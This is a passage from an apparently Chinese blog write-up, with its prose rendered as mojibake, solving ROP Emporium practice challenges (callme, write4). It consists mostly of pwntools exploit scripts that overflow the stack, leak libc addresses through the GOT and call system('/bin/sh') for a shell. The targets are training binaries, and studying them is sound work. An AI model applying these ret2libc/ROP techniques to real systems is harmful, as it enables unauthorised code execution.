p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)</span><br><span class="line">payload += p32(<span class="number">3</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;CCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += p32(call_me_three)</span><br><span class="line">payload += p32(pwnme_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)</span><br><span class="line">payload += p32(<span class="number">3</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><h3 id="amd64-2"><a href="#amd64-2" class="headerlink" title="amd64"></a>amd64</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges [14:54:13]</span></span><br><span class="line">$ cat ./callme/solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal =[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io = process(<span class="string">&quot;./callme&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pwnme_addr = <span class="number">0x401A05</span></span><br><span class="line">call_me_one = <span class="number">0x401850</span></span><br><span class="line">call_me_two = <span class="number">0x401870</span></span><br><span class="line">call_me_three = <span class="number">0x401810</span></span><br><span class="line">pppr_addr = <span class="number">0x0000000000401ab0</span></span><br><span class="line">ret_addr = <span class="number">0x00000000004017d9</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += p64(pppr_addr)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(call_me_one)</span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += p64(pwnme_addr)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;&#x27;&#x27;break *0x401850&#x27;&#x27;&#x27;)</span></span><br><span class="line">raw_input(<span class="string">&quot;callme_one&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += p64(pppr_addr)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(call_me_two)</span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += p64(pwnme_addr)</span><br><span class="line">raw_input(<span class="string">&quot;callme_two&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#time.sleep(1)</span></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;break *0x401A4F&#x27;&#x27;&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += p64(pppr_addr)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(call_me_three)</span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += p64(pwnme_addr)</span><br><span class="line">raw_input(<span class="string">&quot;callme_three&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">print</span> io.recv(<span class="number">1024</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><p>è¿™ä¸ªé¢˜ç›®é»˜è®¤æ˜¯ç³»ç»Ÿå¼€å¯äº†aslrï¼Œæˆ‘ä»¬éœ€è¦åšä¸€å®šçš„infoleak</p><h3 id="i386-2"><a href="#i386-2" class="headerlink" title="i386"></a>i386</h3><h4 id="æ–¹æ³•ä¸€-æ³„æ¼ç¡®å®šå‡½æ•°åŸºå€"><a href="#æ–¹æ³•ä¸€-æ³„æ¼ç¡®å®šå‡½æ•°åŸºå€" class="headerlink" title="æ–¹æ³•ä¸€ æ³„æ¼ç¡®å®šå‡½æ•°åŸºå€"></a>æ–¹æ³•ä¸€ æ³„æ¼ç¡®å®šå‡½æ•°åŸºå€</h4><p>å¯¹äºæ–°æ‰‹æ¥è®²ï¼Œä¿¡æ¯æ³„æ¼å¯èƒ½æœ‰ç‚¹é—®é¢˜ï¼Œå› ä¸ºå¯èƒ½å¾ˆéš¾ç¡®å®šï¼Œå’±ä»¬è¦å–çš„æ‰“å°å‡ºæ¥å€¼çš„èŒƒå›´ã€‚<br>æ ˆæº¢å‡ºåï¼Œæ§åˆ¶eipåˆ°printf_plt,ç„¶åæˆ‘ä»¬æ‰“å°printf_gotæ‰€å­˜æ”¾åˆ°å‡½æ•°åœ°å€</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(printf_plt)</span><br><span class="line">pay += p32(pwnme_addr)</span><br><span class="line">pay += p32(printf_got)</span><br><span class="line"><span class="keyword">with</span> open (<span class="string">&quot;paylaod&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> payload:</span><br><span class="line">    payload.write(pay)</span><br></pre></td></tr></table></figure><p>æ„é€ å¦‚ä¸Šåˆ°payload</p><p>æˆ‘ä»¬å…ˆå…³é—­aslr</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~ sudo su</span><br><span class="line">[sudo] password <span class="keyword">for</span> swing: </span><br><span class="line">root@ubuntu:/home/swing<span class="comment"># echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/roprop-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/roprop-01.jpg"></a></p><p>å¯ä»¥å…ˆä»gdbä¸­ç¡®å®šå‡½æ•°åœ°å€</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/roprop-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/roprop-02.jpg"></a></p><p>hexdump ç¡®å®šè¯»å–çš„åç§»</p><p>exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges/write432 [14:57:12]</span></span><br><span class="line">$ cat solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./write432&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">pwnme_addr = <span class="number">0x80485F6</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_plt = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line">printf_offset = libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;printf_plt:0x%x&quot;</span> % printf_plt)</span><br><span class="line">log.info(<span class="string">&quot;pwnme_addr:0x%x&quot;</span> % pwnme_addr)</span><br><span class="line">log.info(<span class="string">&quot;printf_got:0x%x&quot;</span> % printf_got)</span><br><span class="line">log.info(<span class="string">&quot;system_plt:0x%x&quot;</span> % system_plt)</span><br><span class="line">log.info(<span class="string">&quot;binsh_offset: 0x%x&quot;</span> % binsh_offset)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x04A037</span></span><br><span class="line">stdin = <span class="number">0x0804A060</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./write432&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(printf_plt)</span><br><span class="line">pay += p32(pwnme_addr)</span><br><span class="line">pay += p32(printf_got)</span><br><span class="line"></span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_addr = u32(io.recvuntil(<span class="string">&quot;Go&quot;</span>)[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">binsh_addr = (printf_addr - printf_offset)+binsh_offset</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;printf_addr: 0x%x&quot;</span> %printf_addr)</span><br><span class="line">log.info(<span class="string">&quot;binsh_addr : 0x%x&quot;</span> %binsh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pay =  <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(system_plt)</span><br><span class="line">pay += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">pay += p32(binsh_addr)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(pay)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="æ–¹æ³•äºŒ-æ³„æ¼-ç¡®å®šstdinåœ°å€ï¼Œåœ¨ä¸€ä¸ªå¯å†™çš„åœ°å€å†™å…¥-bin-sh"><a href="#æ–¹æ³•äºŒ-æ³„æ¼-ç¡®å®šstdinåœ°å€ï¼Œåœ¨ä¸€ä¸ªå¯å†™çš„åœ°å€å†™å…¥-bin-sh" class="headerlink" title="æ–¹æ³•äºŒ æ³„æ¼ ç¡®å®šstdinåœ°å€ï¼Œåœ¨ä¸€ä¸ªå¯å†™çš„åœ°å€å†™å…¥/bin/sh"></a>æ–¹æ³•äºŒ æ³„æ¼ ç¡®å®šstdinåœ°å€ï¼Œåœ¨ä¸€ä¸ªå¯å†™çš„åœ°å€å†™å…¥/bin/sh</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges/write432 [14:59:18]</span></span><br><span class="line">$ cat solve2.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./write432&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fgets_plt = elf.plt[<span class="string">&#x27;fgets&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pwnme_addr = <span class="number">0x80485F6</span></span><br><span class="line">stdin = <span class="number">0x0804A060</span></span><br><span class="line">buf = <span class="number">0x0804A028</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./write432&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(printf_plt)</span><br><span class="line">pay += p32(pwnme_addr)</span><br><span class="line">pay += p32(stdin)</span><br><span class="line"></span><br><span class="line"><span class="comment">#with open(&quot;payload_2&quot;,&quot;wb&quot;) as payload:</span></span><br><span class="line"><span class="comment">#    payload.write(pay)</span></span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">stdin_addr = u32(io.recvuntil(<span class="string">&quot;Go&quot;</span>)[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line"><span class="keyword">print</span> hex(stdin_addr)</span><br><span class="line">log.info(<span class="string">&quot;stdin_addr : 0x%x&quot;</span> % stdin_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(fgets_plt)</span><br><span class="line">pay += p32(pwnme_addr)</span><br><span class="line">pay += p32(buf)</span><br><span class="line">pay += p32(<span class="number">0x15</span>)</span><br><span class="line">pay += p32(stdin_addr)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(pay)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(system_plt)</span><br><span class="line">pay += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">pay += p32(buf)</span><br><span class="line"></span><br><span class="line">io.sendline(pay)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•ä¸‰-ä¸éœ€è¦æ³„æ¼ï¼Œç”¨gadgetå°†bin-shå†™å…¥"><a href="#æ–¹æ³•ä¸‰-ä¸éœ€è¦æ³„æ¼ï¼Œç”¨gadgetå°†bin-shå†™å…¥" class="headerlink" title="æ–¹æ³•ä¸‰  ä¸éœ€è¦æ³„æ¼ï¼Œç”¨gadgetå°†bin/shå†™å…¥"></a>æ–¹æ³•ä¸‰  ä¸éœ€è¦æ³„æ¼ï¼Œç”¨gadgetå°†bin/shå†™å…¥</h3><p>ç¨‹åºå­˜åœ¨ pop,ebp,pop edi,ret å’Œ mov ediï¼Œebpè¿™æ ·çš„gadget<br>é‚£ä¹ˆæˆ‘å¯ä»¥å°†bin/sh åˆ†ä¸¤æ¬¡å†™å…¥æˆ‘æŒ‡å®šçš„åœ°å€</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges/write432 [15:09:25]</span></span><br><span class="line">$ cat sovle3.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./write432&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_pop_ret = <span class="number">0x080486da</span></span><br><span class="line">mov_edi_ebp = <span class="number">0x8048670</span></span><br><span class="line">pwnme_addr = <span class="number">0x80485F6</span></span><br><span class="line">buf = <span class="number">0x804a028</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_plt = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line">printf_offset = libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;printf_plt:0x%x&quot;</span> % printf_plt)</span><br><span class="line">log.info(<span class="string">&quot;pwnme_addr:0x%x&quot;</span> % pwnme_addr)</span><br><span class="line">log.info(<span class="string">&quot;printf_got:0x%x&quot;</span> % printf_got)</span><br><span class="line">log.info(<span class="string">&quot;system_plt:0x%x&quot;</span> % system_plt)</span><br><span class="line">log.info(<span class="string">&quot;binsh_offset: 0x%x&quot;</span> % binsh_offset)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./write432&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(pop_pop_ret)</span><br><span class="line">pay += p32(buf)</span><br><span class="line">pay += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">pay += p32(mov_edi_ebp)</span><br><span class="line">pay += p32(pop_pop_ret)</span><br><span class="line">pay += p32(buf+<span class="number">4</span>)</span><br><span class="line">pay += <span class="string">&#x27;/sh\x00&#x27;</span></span><br><span class="line">pay += p32(mov_edi_ebp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay += p32(system_plt)</span><br><span class="line">pay += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">pay += p32(buf)</span><br><span class="line"></span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">io.interactive()%</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="amd64-3"><a href="#amd64-3" class="headerlink" title="amd64"></a>amd64</h3><p>æˆ‘æ‰¾ä¸åˆ°é€‚åˆprintfçš„gadget ç„¶åæˆ‘æ”¹ç”¨putsè¿›è¡Œæ³„æ¼</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges/write4 [15:11:51]</span></span><br><span class="line">$ cat solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./write4&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">pwnme_addr = <span class="number">0x4007B5</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400893</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).next()</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./write4&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pay += <span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&#x27;</span></span><br><span class="line">pay += p64(pop_rdi_ret)</span><br><span class="line">pay += p64(puts_got)</span><br><span class="line">pay += p64(puts_plt)</span><br><span class="line">pay += p64(pwnme_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># with open(&quot;payload&quot;,&quot;wb&quot;) as payload:</span></span><br><span class="line"><span class="comment"># payload.write(pay)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">pause()</span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;Go&quot;</span>)[<span class="number">1</span>:<span class="number">7</span>]+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = (puts_addr-puts_offset)+binsh_offset</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;puts_addr: 